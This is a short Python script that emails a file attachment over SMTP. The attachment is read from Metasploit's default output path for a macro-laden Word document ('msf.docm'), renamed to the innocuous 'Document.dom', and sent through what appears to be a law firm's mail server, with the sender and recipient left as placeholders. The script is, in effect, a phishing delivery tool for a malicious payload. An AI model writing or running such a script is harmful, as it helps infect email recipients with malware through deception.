import smtplib,ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


sender_email = "[CHANGEME]"
receiver_email= "[CHANGEME]"

message = MIMEMultipart("")
message ["Subject"] = "[CHANGEME]"
message ["From"] = sender_email
message ["To"] = receiver_email

text = """\ 
Mesaj
"""

part1 = MIMEText (text, "plain")
message.attach(part1)

filepath = "Users/mince/.msf4/local/msf.docm"
part2 = MIMEBase ( 'application', "octet-stream")
part2.set_payload (open(filepath,"rb").read()   )
encoders.encode_base64(part2)


# you can change filename
part2.add_header ('Content-Disposition', 'attachment; filename="Document.dom" ')   
message.attach(part2)

#Create secure connectio  with server and send email
context = ssl.create_default_context()
server= smtplib.SMTP ("mail.securelawfirm.com" , 587)
server.starttls()
server.ehlo_or_hello_if_needed()
server.sendmail(
    sender_email, receiver_email ,message.as_string()
)


